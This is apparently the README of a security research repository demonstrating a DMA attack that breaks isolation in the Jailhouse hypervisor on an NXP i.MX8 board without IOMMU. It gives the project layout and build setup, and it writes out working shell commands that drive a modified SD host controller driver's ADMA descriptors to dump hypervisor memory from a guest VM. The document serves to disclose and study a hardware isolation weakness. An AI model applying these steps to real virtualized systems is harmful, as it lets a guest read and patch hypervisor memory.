# Breaking isolation of Jailhouse with DMA and I/O passthrough
This repository contains a demo and the source code of a DMA attack on the hypervisor Jailhouse on a platform without IOMMU (IMX8QMEVK).  The attacking VM has directly assigned an SD Host Controller (I/O passthrough), which allows it to access an SD card. Through the DMA-capabilities of the SD Host controller and a modified SDHCI driver, the attacking VM is able to read or write to any memory location and bypass the hypervisor.  The driver allows low-level control of ADMA descriptor tables to perform DMA operations. 

**Advertisement**:

​	**The code is given as is and serves simply as a demonstration of a straightforward attack in a virtualized system. For this reason, this modified driver is neither optimized nor developed to run on different environment (e.g. ADMA 64-bit).**



**Demonstration of the attack allowing a VM to dump and patch hypervisor code and data through DMA of the SD host controller: https://www.youtube.com/watch?v=bvEQDTcnRAE**




### Env/
- Root Linux cell: imx8mq.c

- Linux inmate cell: inmate.c
- Root Linux device tree: imx8mq-evk-root.dts
- Linux inmate device tree: inmate.dts
- Script to lunch Jailhouse and the inmate: init_jh

### ADMA/
- Modified SDHCI driver to control ADMA tables: **sdhci-esdhc-imx-dbg.c**

- Convenient script to dump memory region using ADMA: dma_dump.sh

### Experimental environement:

Target platform: NXP i.MX8MQ-evk
Linux version: 6.1.55+g770c5fe2c1d1 (oe-user@oe-host) (aarch64-poky-linux-gcc (GCC) 12.3.0, GNU ld (GNU Binutils) 2.40.0.20230703)

**Yocto Build configuration:**
	BB_VERSION           = "2.4.0"

​	BUILD_SYS            = "x86_64-linux"

​	NATIVELSBSTRING      = "universal"

​	TARGET_SYS           = "aarch64-poky-linux"

​	MACHINE              = "imx8mqevk"

​	DISTRO               = "fsl-imx-wayland"

​	DISTRO_VERSION       = "6.1-mickledore"

​	TUNE_FEATURES        = "aarch64 armv8a crc crypto"



### Useful control functions on ADMA descriptor tables :

```c
#Allocates 2 pages for the ADMA descriptor table
echo -n -e '\x02\x00\x00\x00'  > /sys/devices/platform/soc\@0/soc\@0\:bus\@30800000/30b40000.mmc/request_desc_table
```

```c
#Inserts descripor 0xfdc01000 - 0x00000023 at position 1 in the ADMA descriptor table
echo -n -e '\x00\x10\xc0\xfd\x23\x00\x00\x00\x01\x00\x00\x00'  > /sys/devices/platform/soc\@0/soc\@0\:bus\@30800000/30b40000.mmc/insert_desc
```

```c
#Fills the descriptor table with arbitrary descriptors 
echo -n -e '\x00\x00\xe7\xfa\x21\x00\x00\x10'  > /sys/devices/platform/soc\@0/soc\@0\:bus\@30800000/30b40000.mmc/fill_custom_desc
```

```c
#Resets the ADMA (does not deallocate the ADMA descriptor table)
cat /sys/devices/platform/soc\@0/soc\@0\:bus\@30800000/30b50000.mmc/adma_rst_addr
#Free the allocated pages for the descriptor table
cat /sys/devices/platform/soc\@0/soc\@0\:bus\@30800000/30b40000.mmc/free_desc_table  
#Set ADMA_SYS_ADDR to 0xfaf00000 
./busybox-1.35.0/busybox devmem 0x30b40058 32 0xfaf00000
```

```c
#Dumping 1KB of RAM from memory 0xFDC00000 to file /mnt/out on the SD card
insmod sdhci-esdhc-imx-dbg.ko 
mount /dev/mmcblk2p2 /mnt/ && ls /mnt/
//Dump 1k bytes memory from address 0xFDC00000 in file /mnt/out 
echo -n -e '\x00\x00\xc0\xfd'  > /sys/devices/platform/soc\@0/soc\@0\:bus\@30800000/30b50000.mmc/adma_read && dd if=/dev/random of=/mnt/out bs=1k count=1 && cat /sys/devices/platform/soc\@0/soc\@0\:bus\@30800000/30b50000.mmc/adma_rst_addr && umount /mnt/ && mount /dev/mmcblk2p2 /mnt/ && hexdump -C /mnt/out
```

